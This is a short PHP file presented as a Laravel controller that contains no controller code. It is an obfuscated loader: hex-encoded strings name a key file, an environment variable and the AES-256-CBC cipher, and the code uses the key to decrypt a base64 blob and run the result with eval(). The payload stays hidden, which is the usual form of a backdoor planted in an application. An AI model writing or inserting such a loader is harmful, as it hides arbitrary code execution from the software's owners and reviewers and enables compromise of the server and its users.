<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('3Ak8HtY9iSmt4/KVNY71LA==');

$c=base64_decode(

'gnlCvQOs6QXA2oeYyzJw9TF/0wlhrfjktaxj/I6FaIkwQZGjvDIOXoRKYG5PU8hZOLtqFiA5qWes' .
'eVpl1csj6joDy0KY1nxMsNT7+x8CttOo5bw/gTRzhEEFCtqMz8pnoX8gUv+Cg+VYwcXV0NXBqjQW' .
'hOBFYjm+zE2+4ynJxoGfpWIqsnAEOLuXq/zqvEbtAUt1H77AD/f/dPD13AyjKTa23eETsDxHk9+A' .
'edQ3pGgycwKvBhPpaozKVOfXWLOD'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

